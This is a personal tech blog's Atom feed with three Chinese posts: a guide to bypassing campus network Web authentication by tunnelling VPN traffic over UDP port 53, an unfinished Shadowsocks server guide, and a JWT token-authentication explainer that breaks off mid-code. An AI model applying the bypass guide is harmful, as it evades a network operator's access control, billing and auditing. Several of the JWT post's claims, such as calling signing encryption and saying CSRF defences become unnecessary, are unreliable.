<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PeteFu</title>
  
  <subtitle>show me the code</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://baronfu.github.io/"/>
  <updated>2018-06-06T11:53:27.523Z</updated>
  <id>https://baronfu.github.io/</id>
  
  <author>
    <name>Pete Fu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用UDP 53/67/68 端口转发，实现无限流量上网</title>
    <link href="https://baronfu.github.io/2018/06/05/%E5%88%A9%E7%94%A8UDP-53-67-68-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8C%E5%AE%9E%E7%8E%B0%E6%97%A0%E9%99%90%E6%B5%81%E9%87%8F%E4%B8%8A%E7%BD%91/"/>
    <id>https://baronfu.github.io/2018/06/05/利用UDP-53-67-68-端口转发，实现无限流量上网/</id>
    <published>2018-06-05T02:57:15.000Z</published>
    <updated>2018-06-06T11:53:27.523Z</updated>
    
    <content type="html"><![CDATA[<p>  本文将介绍一种通过绕过校园网Web认证来实现免费上网的姿势，不敢保证在所有的网络环境下此方法都适用<a id="more"></a></p><h1 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一.背景介绍"></a>一.背景介绍</h1><p>内地很多大学的校园网都是使用了锐捷认证客户端来认证上网的，大多数校园网存在限制上网流量，零点过后限制上网问题。当然这也是出于学校对学生管理的限制以及校园带宽小问题。</p><h1 id="二-原理介绍"><a href="#二-原理介绍" class="headerlink" title="二.原理介绍"></a>二.原理介绍</h1><p>在连接到某个需要 Web 认证的热点之前，我们已经获得了一个内网 IP，此时，如果我们访问某个 HTTP 网站，网关会对这个 HTTP 响应报文劫持并篡改，302 重定向给我们一个 web 认证界面,详细原理可以<a href="http://www.ruijie.com.cn/fw/wt/36502" target="_blank" rel="noopener">戳这里</a></p><p>网关（交换机）都默认放行 DHCP 和 DNS 报文，也就是 UDP53 与 UDP67/UDP 68。有些网关甚至不会报文进行检查，这也就意味着任何形式的数据包都可以顺畅通过。</p><p>既然如此，我们就可以在公网搞一台服务器，然后借此来免费上网，顺便还能防止网络审计，也就是说我们只需把钱花在服务器上，就可以实现免费上网了（是不是很溜~）。</p><h1 id="三-环境检测"><a href="#三-环境检测" class="headerlink" title="三.环境检测"></a>三.环境检测</h1><p>在未Web认证的情况下向一些公共DNS服务器发送DNS查询包是可以得到正确响应的（这里查询的是百度），而DNS服务器为53端口，通过UDP协议传送数据，由此可见校园网服务器在重定向的时候没有对53端口进行劫持。</p><p>废话不多说，先检测网络环境是不是符合免流量上网，先不要进行Web认证(不要登蝴蝶)，打开cmd(或者Linux Terminal)，输入以下命令：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup www.baidu.com</span><br></pre></td></tr></table></figure></blockquote><p>我的结果如下：</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/upd53%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%B5%8B.PNG" alt="UPD 53端口检测"></p><p>上面在没有进行 Web 认证的情况下成功查询到的 IP 地址，但是我们并无法确定网关是放行了 UDP 53 的所有数据包还是只放行了 DNS 报文。所以我们要进一步测试下！如果连这都过不了，那还是洗洗睡吧。下面提供的工具实际是测试TCP 53端口，但是如果允许 TCP，那么 UDP 也肯定没问题。</p><p><a href="https://github.com/BennyThink/UDP53-Filter-Type" target="_blank" rel="noopener">项目地址</a></p><p>去 Git 仓库下载源码，之后 Linux 用户运行</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;python UDP53.py</span><br></pre></td></tr></table></figure></blockquote><p>Windows 用户直接双击 dist 下的 udp.exe</p><p>下图是 Windows 下的运行结果</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/upd53%E6%A3%80%E6%B5%8B.PNG" alt="UDP 53 检测"></p><h1 id="四-实战（搭建基于UDP53的VPN）"><a href="#四-实战（搭建基于UDP53的VPN）" class="headerlink" title="四.实战（搭建基于UDP53的VPN）"></a>四.实战（搭建基于UDP53的VPN）</h1><p>接下来介绍基于UDP53端口的VPN搭建使用的工具、搭建的具体步骤以及注意的事项。</p><h2 id="购买云服务器"><a href="#购买云服务器" class="headerlink" title="购买云服务器"></a>购买云服务器</h2><p>准备一台具有公网IP的云服务器，国内的云服务商（<a href="https://www.aliyun.com/" target="_blank" rel="noopener">阿里云</a>、<a href="https://cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a>、<a href="https://www.jdcloud.com/" target="_blank" rel="noopener">京东云</a> 等等），国外的云服务商（<a href="https://bwh1.net/index.php" target="_blank" rel="noopener">搬瓦工</a>、<a href="https://www.vultr.com/?ref=7311531" target="_blank" rel="noopener">Vultr</a> 等等）</p><p>在这里我推荐购买国内的服务器，理由是阿里云或者腾讯云的云服务器性价比高，而且针对在校学生有学生优惠，这里我购买的是腾讯<a href="https://cloud.tencent.com/act/campus" target="_blank" rel="noopener">10RMB/月学生机</a>（可能现在的优惠价格不一样了，之前的学生优惠是1RMB/月）</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/%E8%85%BE%E8%AE%AF%E5%AD%A6%E7%94%9F%E6%9C%BA1.png" alt="腾讯云学生机1"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/%E8%85%BE%E8%AE%AF%E5%AD%A6%E7%94%9F%E6%9C%BA2.png" alt="腾讯云学生机2"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/%E8%85%BE%E8%AE%AF%E5%AD%A6%E7%94%9F%E6%9C%BA3.png" alt="腾讯云学生机3"></p><h2 id="使用Xshell登录云服务器"><a href="#使用Xshell登录云服务器" class="headerlink" title="使用Xshell登录云服务器"></a>使用Xshell登录云服务器</h2><p>Xshell是一个要收费的远程登录工具，下载免费Xshell <a href="https://pan.baidu.com/s/1bqIe9xsqO4C9ggSwiwidmQ" target="_blank" rel="noopener">戳这里百度网盘</a>  密码：2a3a</p><p>下面是登录远程云服务操作：</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/Xshell0.png" alt="Xshell0"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/Xshell1.png" alt="Xshell1"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/Xshell2.png" alt="Xshell2"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/Xshell3.png" alt="Xshell3"></p><h2 id="安装SoftEther-VPN-Server服务"><a href="#安装SoftEther-VPN-Server服务" class="headerlink" title="安装SoftEther VPN Server服务"></a>安装SoftEther VPN Server服务</h2><p>SoftEther VPN 是日本筑波大学的一个研究项目，是一个开放源代码的跨平台多协议 VPN 程序，它包括服务器端、客户端、服务器端管理工具等数个软件，支持 SSL-VPN (SoftEtherVPN) 协议、 L2TP/IPsec 协议、 OpenVPN 协议和 Microsoft SSTP 协议，Windows、Linux、Android 和 IOS 等操作系统都可以连接到 SoftEther VPN 服务器。</p><p>安装SoftEther VPN Server之前，先安装升级GCC环境，输入以下命令：</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_6_centos ~]# yum install gcc gcc-c++ make tar -y</span><br></pre></td></tr></table></figure></blockquote><p>下载安装linux版的SoftEther</p><p>32 位系统下载，执行下面命令：</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_6_centos ~]# wget http://oks2t4o68.bkt.clouddn.com/softether-vpnserver-v4.22-9634-beta-2016.11.27-linux-x86-32bit.tar.gz</span><br></pre></td></tr></table></figure></blockquote><p>64 位系统下载，执行下面命令：</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_6_centos ~]# wget http://oks2t4o68.bkt.clouddn.com/softether-vpnserver-v4.22-9634-beta-2016.11.27-linux-x64-64bit.tar.gz</span><br></pre></td></tr></table></figure></blockquote><p>将软件包进行解压，然后进入解压后的vpnserver目录，make执行安装</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_6_centos ~]# tar -zxvf softether-vpnserver-v4.22-9634-beta-2016.11.27-linux-x64-64bit.tar.gz</span><br><span class="line">[root@VM_0_6_centos ~]# cd vpnserver/</span><br><span class="line">[root@VM_0_6_centos vpnserver]# make</span><br></pre></td></tr></table></figure></blockquote><p>接下来会有三次选择要求选yes还是no,都选择yes，回车就成功安装softether</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether1.png" alt="softether1"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether2.png" alt="softether2"></p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//启动softether服务</span><br><span class="line">[root@VM_0_6_centos vpnserver]# ./vpnserver start</span><br><span class="line">//进入softether命令行</span><br><span class="line">[root@VM_0_6_centos vpnserver]# ./vpncmd</span><br></pre></td></tr></table></figure></blockquote><p>执行./vpncmd后连续回车两次，进入softether server管理命令行，然后输入ServerPasswordSet,设置管理密码（记住这个密码，马上要用到）。</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether4.png" alt="softether4"><br><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether5.png" alt="softether5"><br><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether6.png" alt="softether6"></p><h2 id="在本地远程配置softether-VPN-Server"><a href="#在本地远程配置softether-VPN-Server" class="headerlink" title="在本地远程配置softether VPN Server"></a>在本地远程配置softether VPN Server</h2><p>先在Windows系统下下载安装softether软件，<a href="https://pan.baidu.com/share/init?surl=pKTOPib" target="_blank" rel="noopener">百度网盘</a> 密码: i3e2<br>安装好以后，按以下步骤配置softether</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE1.png" alt="softether配置1"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE2.png" alt="softether配置2"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE3.png" alt="softether配置3"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE4.png" alt="softether配置4"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE5.png" alt="softether配置5"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE6.png" alt="softether配置6"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE7.png" alt="softether配置7"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE8.png" alt="softether配置8"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE9.png" alt="softether配置9"></p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/softether%E9%85%8D%E7%BD%AE10.png" alt="softether配置10"></p><h2 id="安装配置openvpn客户端"><a href="#安装配置openvpn客户端" class="headerlink" title="安装配置openvpn客户端"></a>安装配置openvpn客户端</h2><p>要下载安装openvpn,<a href="http://www.softpedia.com/get/Security/Security-Related/SoftEther-VPN.shtmlhttp://" target="_blank" rel="noopener">戳这里</a></p><p>把这个ovpn文件提取出来，然后放在openVPN的config目录下。</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/openvpn.png" alt="openvpn"></p><p>我已经把文件名改为快连我</p><p>把所有登陆校园网的账号退出。</p><p>打开openVPN，右下角出现一个带锁的电脑图标。</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/openvpn2.png" alt="openvpn1"></p><p>输入之前我们设置的用户的账号密码</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/openvpn3.png" alt="openvpn2"></p><p>电脑图标变为绿色，打开浏览器，就可以无限上网了，拯救地球村的计划成功~，嘻嘻嘻嘻</p><p><img src="http://ot69d3edf.bkt.clouddn.com/2018-06-05/png/openvpn4.png" alt="openvpn3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  本文将介绍一种通过绕过校园网Web认证来实现免费上网的姿势，不敢保证在所有的网络环境下此方法都适用
    
    </summary>
    
    
      <category term="VPN" scheme="https://baronfu.github.io/tags/VPN/"/>
    
      <category term="OpenVPN" scheme="https://baronfu.github.io/tags/OpenVPN/"/>
    
      <category term="SoftEther" scheme="https://baronfu.github.io/tags/SoftEther/"/>
    
      <category term="UDP" scheme="https://baronfu.github.io/tags/UDP/"/>
    
  </entry>
  
  <entry>
    <title>VPS搭建SS服务器教程</title>
    <link href="https://baronfu.github.io/2018/05/30/VPS%E6%90%AD%E5%BB%BASS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://baronfu.github.io/2018/05/30/VPS搭建SS服务器教程/</id>
    <published>2018-05-30T10:50:54.000Z</published>
    <updated>2018-06-06T15:28:51.176Z</updated>
    
    <content type="html"><![CDATA[<p> 本文介绍如何通过购买国外的VPS服务器搭建自己的个人SS翻墙服务器<a id="more"></a></p><h1 id="国外服务器的购买"><a href="#国外服务器的购买" class="headerlink" title="国外服务器的购买"></a>国外服务器的购买</h1><p>国外的VPS服务器供应商有很多，比较有名的Vultr、SugarHosts、BandwagonHost(搬瓦工)、RAKSmart、Linode、DigitalOcean等等。</p><p>这里我选择的是Vultr，对比了很多国外的服务器，这个蛮靠谱的，且搭建成功后看youtube720p完全无压力。</p><p>Vultr官网链接: <a href="https://www.vultr.com/?ref=7311531" target="_blank" rel="noopener">Vultr The Infrastructure Cloud™</a></p><h2 id="Vultr服务器价格"><a href="#Vultr服务器价格" class="headerlink" title="Vultr服务器价格"></a>Vultr服务器价格</h2><p>Vultr服务器按小时计费，最低配置（1CPU/512MB/500GB）0.0004美元/h,算起来2.5美元/月,且destory掉服务器是不收费的，所以不用担心如果暂时没有使用还一直扣费的问题，如下图所示：<br><img src="http://ot69d3edf.bkt.clouddn.com/34831-20160622150124531-1416052185.png" alt="Token"></p><p>#还未写完，请待续~~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 本文介绍如何通过购买国外的VPS服务器搭建自己的个人SS翻墙服务器
    
    </summary>
    
    
      <category term="SS" scheme="https://baronfu.github.io/tags/SS/"/>
    
      <category term="翻墙" scheme="https://baronfu.github.io/tags/%E7%BF%BB%E5%A2%99/"/>
    
      <category term="VPN" scheme="https://baronfu.github.io/tags/VPN/"/>
    
      <category term="VPS" scheme="https://baronfu.github.io/tags/VPS/"/>
    
      <category term="Vultr" scheme="https://baronfu.github.io/tags/Vultr/"/>
    
  </entry>
  
  <entry>
    <title>基于Token的WEB后台认证机制</title>
    <link href="https://baronfu.github.io/2018/05/28/%E5%9F%BA%E4%BA%8EToken%E7%9A%84WEB%E5%90%8E%E5%8F%B0%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/"/>
    <id>https://baronfu.github.io/2018/05/28/基于Token的WEB后台认证机制/</id>
    <published>2018-05-28T09:21:38.000Z</published>
    <updated>2018-06-06T03:58:48.398Z</updated>
    
    <content type="html"><![CDATA[<p> 本文介绍HTTP Basic Auth、OAuth、Cookie Auth和Token这几种常见的WEB后台认证机制<a id="more"></a></p><h1 id="HTTP-Basic-Auth"><a href="#HTTP-Basic-Auth" class="headerlink" title="HTTP Basic Auth"></a>HTTP Basic Auth</h1><p>HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的RESTful API时，尽量避免采用HTTP Basic Auth</p><h1 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h1><p><strong>OAuth</strong>（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。</p><p><strong>OAuth</strong>允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，<strong>OAuth</strong>让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容<br>下面是<strong>OAuth2.0</strong>的流程：</p><p><img src="http://ot69d3edf.bkt.clouddn.com/34831-20160622150107172-139099471.png" alt="OAuth"><br>这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合拥有自有认证权限管理的企业应用；</p><h1 id="Cookie-Auth"><a href="#Cookie-Auth" class="headerlink" title="Cookie Auth"></a>Cookie Auth</h1><p>Cookie认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建了一个Cookie对象；通过客户端带上来Cookie对象来与服务器端的session对象匹配来实现状态管理的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time使cookie在一定时间内有效；</p><h1 id="Token-Auth"><a href="#Token-Auth" class="headerlink" title="Token Auth"></a>Token Auth</h1><p><img src="http://ot69d3edf.bkt.clouddn.com/34831-20160622150124531-1416052185.png" alt="Token"></p><p><strong>Token Auth的优点</strong><br>Token机制相对于Cookie机制又有什么好处呢？</p><ul><li><strong>支持跨域访问</strong>: Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输.</li><li><strong>无状态(也称：服务端可扩展行)</strong>:Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息.</li><li><strong>更适用CDN</strong>: 可以通过内容分发网络请求你服务端的所有资料（如：javascript，HTML,图片等），而你的服务端只要提供API即可.</li><li><strong>去耦</strong>: 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可.</li><li><strong>更适用于移动应用</strong>: 当你的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。</li><li><strong>CSRF</strong>:因为不再依赖于Cookie，所以你就不需要考虑对CSRF（跨站请求伪造）的防范。</li><li><strong>性能</strong>: 一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算 的Token验证和解析要费时得多.</li><li><strong>不需要为登录页面做特殊处理</strong>: 如果你使用Protractor 做功能测试的时候，不再需要为登录页面做特殊处理.</li><li><strong>基于标准化</strong>:你的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）.</li></ul><h1 id="基于JWT的Token认证机制实现"><a href="#基于JWT的Token认证机制实现" class="headerlink" title="基于JWT的Token认证机制实现"></a>基于JWT的Token认证机制实现</h1><p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。其</p><p><strong>JWT的组成</strong></p><p>一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。<br><strong>载荷（Payload）</strong></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;iss&quot;: &quot;Online JWT Builder&quot;, </span><br><span class="line">&quot;iat&quot;: 1416797419, </span><br><span class="line">&quot;exp&quot;: 1448333419, </span><br><span class="line">&quot;aud&quot;: &quot;www.example.com&quot;, </span><br><span class="line">&quot;sub&quot;: &quot;jrocket@example.com&quot;, </span><br><span class="line">&quot;GivenName&quot;: &quot;Johnny&quot;, </span><br><span class="line">&quot;Surname&quot;: &quot;Rocket&quot;, </span><br><span class="line">&quot;Email&quot;: &quot;jrocket@example.com&quot;, </span><br><span class="line">&quot;Role&quot;: [ &quot;Manager&quot;, &quot;Project Administrator&quot; ] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><ul><li>iss: 该JWT的签发者，是否使用是可选的；</li><li>sub: 该JWT所面向的用户，是否使用是可选的；</li><li>aud: 接收该JWT的一方，是否使用是可选的；</li><li>exp(expires): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的；</li><li>iat(issued at): 在什么时候签发的(UNIX时间)，是否使用是可选的；</li><li>其他还有：</li><li>nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，是否使用是可选的；</li></ul><p>将上面的JSON对象进行[base64编码]可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9</span><br></pre></td></tr></table></figure></blockquote><p>小知识：Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。JDK 中提供了非常方便的 BASE64Encoder 和 BASE64Decoder，用它们可以非常方便的完成基于 BASE64 的编码和解码</p><p><strong>头部（Header）</strong><br>JWT还需要一个头部，头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。这也可以被表示成一个JSON对象。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#123;</span><br><span class="line">&gt;&quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">&gt;&quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>在头部指明了签名算法是HS256算法。<br>当然头部也要进行BASE64编码，编码后的字符串如下：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure></blockquote><p><strong>签名（Signature）</strong><br>将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了:</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;font color=&quot;red&quot;&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&lt;/font&gt;.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0</span><br></pre></td></tr></table></figure></blockquote><p>最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）。如果我们用mystar作为密钥的话，那么就可以得到我们加密后的内容:</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM</span><br></pre></td></tr></table></figure></blockquote><p>最后将这一部分签名也拼接在被签名的字符串后面，我们就得到了完整的JWT:</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM</span><br></pre></td></tr></table></figure></blockquote><p>在我们的请求URL中会带上这串JWT字符串：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; https://your.awesome-app.com/make-friend/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM</span><br></pre></td></tr></table></figure></blockquote><p><strong>认证过程</strong></p><p>下面我们从一个实例来看如何运用JWT机制实现认证：</p><p><strong>登录</strong></p><ul><li>第一次认证：第一次登录，用户从浏览器输入用户名/密码，提交后到服务器的登录处理的Action层（Login Action）；</li><li>Login Action调用认证服务进行用户名密码认证，如果认证通过，Login Action层调用用户信息服务获取用户信息（包括完整的用户信息及对应权限信息）；</li><li>返回用户信息后，Login Action从配置文件中获取Token签名生成的秘钥信息，进行Token的生成；</li><li>生成Token的过程中可以调用第三方的JWT Lib生成签名后的JWT数据；</li><li>完成JWT数据签名后，将其设置到COOKIE对象中，并重定向到首页，完成登录过程；</li></ul><p><img src="http://ot69d3edf.bkt.clouddn.com/34831-20160622152259735-1969767936.jpg" alt="登录过程"></p><p><strong>请求认证</strong></p><p>基于Token的认证机制会在每一次请求中都带上完成签名的Token信息，这个Token信息可能在COOKIE<br>中，也可能在HTTP的Authorization头中；</p><p><img src="http://ot69d3edf.bkt.clouddn.com/34831-20160622152344250-1238130627.jpg" alt="请求过程"></p><ul><li>客户端（APP客户端或浏览器）通过GET或POST请求访问资源（页面或调用API）；</li><li>认证服务作为一个Middleware HOOK 对请求进行拦截，首先在cookie中查找Token信息，如果没有找到，则在HTTP Authorization Head中查找；</li><li>如果找到Token信息，则根据配置文件中的签名加密秘钥，调用JWT Lib对Token信息进行解密和解码；</li><li>完成解码并验证签名通过后，对Token中的exp、nbf、aud等信息进行验证；</li><li>全部通过后，根据获取的用户的角色权限信息，进行对请求的资源的权限逻辑判断；</li><li>如果权限逻辑判断通过则通过Response对象返回；否则则返回HTTP 401；</li></ul><p><strong>对Token认证的五点认识</strong></p><p>对Token认证机制有5点直接注意的地方：</p><ul><li>一个Token就是一些信息的集合；</li><li>在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；</li><li>服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查；</li><li>基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；</li><li>因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的；</li></ul><p><strong>JWT的JAVA实现</strong></p><p>Java中对JWT的支持可以考虑使用JJWT开源库；JJWT实现了JWT, JWS, JWE 和 JWA RFC规范；下面将简单举例说明其使用：<br><strong>生成Token码</strong></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line">&gt; <span class="keyword">import</span> javax.xml.bind.DatatypeConverter;</span><br><span class="line">&gt; <span class="keyword">import</span> java.security.Key;</span><br><span class="line">&gt; <span class="keyword">import</span> io.jsonwebtoken.*;</span><br><span class="line">&gt; <span class="keyword">import</span> java.util.Date;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//Sample method to construct a JWT</span></span><br><span class="line">&gt; <span class="function"><span class="keyword">private</span> String <span class="title">createJWT</span><span class="params">(String id, String issuer, String subject, <span class="keyword">long</span> ttlMillis)</span> </span>&#123;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//The JWT signature algorithm we will be using to sign the token</span></span><br><span class="line">&gt; SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;</span><br><span class="line">&gt; <span class="keyword">long</span> nowMillis = System.currentTimeMillis();</span><br><span class="line">&gt; Date now = <span class="keyword">new</span> Date(nowMillis);</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//We will sign our JWT with our ApiKey secret</span></span><br><span class="line">&gt; <span 